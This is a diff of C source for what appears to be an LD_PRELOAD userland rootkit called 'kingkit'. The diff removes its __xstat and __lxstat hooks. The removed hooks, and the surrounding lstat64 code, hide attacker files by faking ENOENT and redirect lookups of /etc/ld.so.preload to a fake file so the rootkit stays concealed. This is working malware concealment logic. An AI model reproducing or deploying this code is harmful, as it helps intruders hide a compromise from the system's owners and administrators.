@@ -81,10 +81,8 @@ int access(const char *, int);
 int faccessat(int, const char *, int, int);
 int stat(const char *restrict, struct stat *);
 int stat64(const char *restrict, struct stat64 *);
-int __xstat(const char *restrict, struct stat *);
 int lstat(const char *restrict, struct stat *);
 int lstat64(const char *restrict, struct stat64 *);
-int __lxstat(const char *restrict, struct stat *);
 int fstatat(int, const char *restrict, struct stat *restrict, int);
 int fstatat64(int, const char *restrict, struct stat64 *restrict, int);
 struct statx;/* otherwise compiler will complain */int statx(int, const char *restrict, int, unsigned int, struct statx *restrict);
@@ -116,10 +114,8 @@ static int (*original_access)(const char *, int) = NULL;
 static int (*original_faccessat)(int, const char *, int, int) = NULL;
 static int (*original_stat)(const char *restrict, struct stat *) = NULL;
 static int (*original_stat64)(const char *restrict, struct stat64 *) = NULL;
-static int (*original___xstat)(const char *restrict, struct stat *) = NULL;
 static int (*original_lstat)(const char *restrict, struct stat *) = NULL;
 static int (*original_lstat64)(const char *restrict, struct stat64 *) = NULL;
-static int (*original___lxstat)(const char *restrict, struct stat *) = NULL;
 static int (*original_fstatat)(int, const char *restrict, struct stat *restrict, int) = NULL;
 static int (*original_fstatat64)(int, const char *restrict, struct stat64 *restrict, int) = NULL;
 static int (*original_statx)(int, const char *restrict, int, unsigned int, struct statx *restrict) = NULL;
@@ -862,25 +858,6 @@ int stat64(const char *restrict pathname, struct stat64 *statbuf) {
 }
 
 
-int __xstat(const char *restrict pathname, struct stat *statbuf) {
-    #if DEBUG
-	printf("[kingkit] __xstat called with pathname: %s.\n", pathname);
-    #endif
-    original___xstat = syscall_address(original___xstat, "__xstat");
-    char *real_pathname = realpath(pathname, NULL);
-    if (real_pathname == NULL)
-        return (*original___xstat)(pathname, statbuf);
-    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
-        pathname = FAKE_PRELOAD;
-    else if (is_hidden(real_pathname)) {
-        free(real_pathname);
-        errno = ENOENT;
-        return -1;
-    }
-    free(real_pathname);
-    return (*original___xstat)(pathname, statbuf);
-}
-
 
 int lstat(const char *restrict pathname, struct stat *statbuf) {
     #if DEBUG
@@ -919,26 +896,6 @@ int lstat64(const char *restrict pathname, struct stat64 *statbuf) {
     }
     free(real_pathname);
     return (*original_lstat64)(pathname, statbuf);
-}
-
-
-int __lxstat(const char *restrict pathname, struct stat *statbuf) {
-    #if DEBUG
-	printf("[kingkit] __lxstat called with pathname: %s.\n", pathname);
-    #endif
-    original___lxstat = syscall_address(original___lxstat, "__lxstat");
-    char *real_pathname = realpath(pathname, NULL);
-    if (real_pathname == NULL) //catch errors like ENOENT
-        return (*original___lxstat)(pathname, statbuf);
-    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
-        pathname = FAKE_PRELOAD;
-    else if (is_hidden(real_pathname)) {
-        free(real_pathname);
-        errno = ENOENT;
-        return -1;
-    }
-    free(real_pathname);
-    return (*original___lxstat)(pathname, statbuf);
 }
 
 
